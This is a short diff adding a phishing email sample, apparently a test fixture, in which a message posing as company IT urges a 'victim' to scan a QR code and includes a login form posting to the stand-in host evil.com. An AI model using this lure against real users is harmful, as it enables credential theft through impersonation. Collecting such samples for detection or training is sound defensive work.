@@ -1,0 +1,5 @@
+Subject: Login with QR
+From: it@company.com
+To: victim@company.com
+
+Scan the QR code to login to the portal. <img src='cid:qr1' /> <form action='http://evil.com/login' type='password'></form>
